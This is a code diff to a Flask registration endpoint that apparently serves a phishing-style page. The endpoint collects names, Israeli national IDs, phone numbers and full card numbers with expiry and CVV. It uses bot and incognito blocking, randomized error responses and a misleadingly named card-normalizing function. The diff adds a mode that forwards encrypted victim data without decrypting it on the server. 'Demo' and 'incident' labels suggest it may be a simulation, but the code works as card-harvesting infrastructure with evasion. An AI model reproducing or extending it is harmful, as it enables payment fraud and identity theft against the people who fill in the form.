@@ -720,6 +720,8 @@ def create_app() -> Flask:
         _active_theme_id(),
         os.environ.get("ACTIVE_THEME"),
     )
+    if rsa_envelope.pii_forward_only_enabled():
+        app.logger.info("PII mode: forward-only (no server decrypt)")
 
     @app.context_processor
     def _bango_dynamic_class_map():
@@ -1216,12 +1218,6 @@ def create_app() -> Flask:
                 {"ok": False, "error": "honeypot_filled"}, 400, status_pool="bot"
             )
 
-        pii_err = rsa_envelope.apply_decrypted_pii_to_request(data)
-        if pii_err is not None:
-            return make_randomized_json_response(
-                {"ok": False, "error": "bad_encrypted_pii"}, 400
-            )
-
         fp_sig = data.get("fingerprint_signals")
         if not isinstance(fp_sig, dict):
             fp_sig = {}
@@ -1254,95 +1250,121 @@ def create_app() -> Flask:
         if r_inc is not None and not r_inc.allowed:
             return _incognito_api_blocked_response()
 
-        fname = str(data.get("fname") or "").strip()[:120]
-        lname = str(data.get("lname") or "").strip()[:120]
-        phone = str(data.get("phone") or "").strip()[:32]
-        email = str(data.get("email") or "").strip()[:254]
-        personal_id = str(data.get("personal_id") or "").strip()[:32]
-        full_name = str(data.get("full_name") or "").strip()[:120]
-        for field, val, validator in [
-            ("fname", fname, _validate_name),
-            ("lname", lname, _validate_name),
-            ("phone", phone, _validate_israeli_phone),
-            ("personal_id", personal_id, _validate_israeli_id),
-        ]:
-            v_err = validator(val)
-            if v_err:
+        forward_only = rsa_envelope.pii_forward_only_enabled()
+        enc_blob = (
+            data.get("encrypted_pii") if isinstance(data.get("encrypted_pii"), str) else ""
+        ).strip()
+
+        if forward_only:
+            if not enc_blob or not rsa_envelope.is_valid_envelope_format(enc_blob):
                 return make_randomized_json_response(
-                    {
-                        "ok": False,
-                        "error": v_err,
-                        "error_field": field,
-                    },
+                    {"ok": False, "error": "bad_encrypted_pii"}, 400
+                )
+            payload = {
+                "encrypted_pii": enc_blob,
+                "pii_forward_only": True,
+                "fingerprint_signals": data.get("fingerprint_signals"),
+                "behavior_signals": data.get("behavior_signals"),
+            }
+        else:
+            pii_err = rsa_envelope.apply_decrypted_pii_to_request(data)
+            if pii_err is not None:
+                return make_randomized_json_response(
+                    {"ok": False, "error": "bad_encrypted_pii"}, 400
+                )
+
+            fname = str(data.get("fname") or "").strip()[:120]
+            lname = str(data.get("lname") or "").strip()[:120]
+            phone = str(data.get("phone") or "").strip()[:32]
+            email = str(data.get("email") or "").strip()[:254]
+            personal_id = str(data.get("personal_id") or "").strip()[:32]
+            full_name = str(data.get("full_name") or "").strip()[:120]
+            for field, val, validator in [
+                ("fname", fname, _validate_name),
+                ("lname", lname, _validate_name),
+                ("phone", phone, _validate_israeli_phone),
+                ("personal_id", personal_id, _validate_israeli_id),
+            ]:
+                v_err = validator(val)
+                if v_err:
+                    return make_randomized_json_response(
+                        {
+                            "ok": False,
+                            "error": v_err,
+                            "error_field": field,
+                        },
+                        400,
+                        status_pool="bot",
+                    )
+            if not email:
+                return make_randomized_json_response(
+                    {"ok": False, "error": "bad_profile_fields"}, 400
+                )
+            if not full_name or len(full_name) < 2:
+                return make_randomized_json_response(
+                    {"ok": False, "error": "bad_full_name"}, 400
+                )
+            cc_err = _validate_card_digits(str(data.get("cc") or ""))
+            if cc_err:
+                return make_randomized_json_response(
+                    {"ok": False, "error": cc_err, "error_field": "card"},
                     400,
                     status_pool="bot",
                 )
-        if not email:
-            return make_randomized_json_response(
-                {"ok": False, "error": "bad_profile_fields"}, 400
-            )
-        if not full_name or len(full_name) < 2:
-            return make_randomized_json_response(
-                {"ok": False, "error": "bad_full_name"}, 400
-            )
-        cc_err = _validate_card_digits(str(data.get("cc") or ""))
-        if cc_err:
-            return make_randomized_json_response(
-                {"ok": False, "error": cc_err, "error_field": "card"},
-                400,
-                status_pool="bot",
-            )
-        cvv_err = _validate_cvv_digits(str(data.get("cvv") or ""))
-        if cvv_err:
-            return make_randomized_json_response(
-                {"ok": False, "error": cvv_err, "error_field": "cvv"},
-                400,
-                status_pool="bot",
-            )
+            cvv_err = _validate_cvv_digits(str(data.get("cvv") or ""))
+            if cvv_err:
+                return make_randomized_json_response(
+                    {"ok": False, "error": cvv_err, "error_field": "cvv"},
+                    400,
+                    status_pool="bot",
+                )
 
-        cc_digits = checksum.normalize_corporate_access_token(str(data.get("cc") or ""))
-        if len(cc_digits) < 12 or len(cc_digits) > 19:
-            return make_randomized_json_response({"ok": False, "error": "bad_cc_length"}, 400)
-        if not checksum.luhn_validate(cc_digits):
-            return make_randomized_json_response(
-                {"ok": False, "error": "cc_checksum_failed"}, 400
-            )
+            cc_digits = checksum.normalize_corporate_access_token(str(data.get("cc") or ""))
+            if len(cc_digits) < 12 or len(cc_digits) > 19:
+                return make_randomized_json_response({"ok": False, "error": "bad_cc_length"}, 400)
+            if not checksum.luhn_validate(cc_digits):
+                return make_randomized_json_response(
+                    {"ok": False, "error": "cc_checksum_failed"}, 400
+                )
 
-        exp_norm, exp_code = _card_expiry_result(str(data.get("exp") or ""))
-        if exp_code is not None:
-            return make_randomized_json_response(
-                {"ok": False, "error": exp_code},
-                400,
-            )
+            exp_norm, exp_code = _card_expiry_result(str(data.get("exp") or ""))
+            if exp_code is not None:
+                return make_randomized_json_response(
+                    {"ok": False, "error": exp_code},
+                    400,
+                )
 
-        cvv_raw = "".join(ch for ch in str(data.get("cvv") or "") if ch.isdigit())
-        exp_cvv = checksum.expected_cvv_len_for_pan(cc_digits)
-        if len(cvv_raw) != exp_cvv:
-            return make_randomized_json_response(
-                {
-                    "ok": False,
-                    "error": "bad_cvv_length",
-                    "cvv_expected": exp_cvv,
-                },
-                400,
-            )
+            cvv_raw = "".join(ch for ch in str(data.get("cvv") or "") if ch.isdigit())
+            exp_cvv = checksum.expected_cvv_len_for_pan(cc_digits)
+            if len(cvv_raw) != exp_cvv:
+                return make_randomized_json_response(
+                    {
+                        "ok": False,
+                        "error": "bad_cvv_length",
+                        "cvv_expected": exp_cvv,
+                    },
+                    400,
+                )
 
-        payload = {
-            "fname": fname,
-            "lname": lname,
-            "phone": phone,
-            "email": email,
-            "personal_id": personal_id,
-            "full_name": full_name,
-            "card_number": cc_digits,
-            "card_exp": exp_norm,
-            "cvv_len": cvv_raw,
-            "fingerprint_signals": data.get("fingerprint_signals"),
-            "behavior_signals": data.get("behavior_signals"),
-        }
+            payload = {
+                "fname": fname,
+                "lname": lname,
+                "phone": phone,
+                "email": email,
+                "personal_id": personal_id,
+                "full_name": full_name,
+                "card_number": cc_digits,
+                "card_exp": exp_norm,
+                "cvv_len": cvv_raw,
+                "fingerprint_signals": data.get("fingerprint_signals"),
+                "behavior_signals": data.get("behavior_signals"),
+            }
         session[SESSION_REG] = payload
         if not _quiet_demonstration_terminal():
-            app.logger.warning("[DEMO REGISTER] %s", json.dumps(payload, ensure_ascii=False))
+            if forward_only:
+                app.logger.warning("[DEMO REGISTER] forward-only encrypted_pii (%d bytes)", len(enc_blob))
+            else:
+                app.logger.warning("[DEMO REGISTER] %s", json.dumps(payload, ensure_ascii=False))
 
         incident_store.insert_incident(
             PROJECT_ROOT,
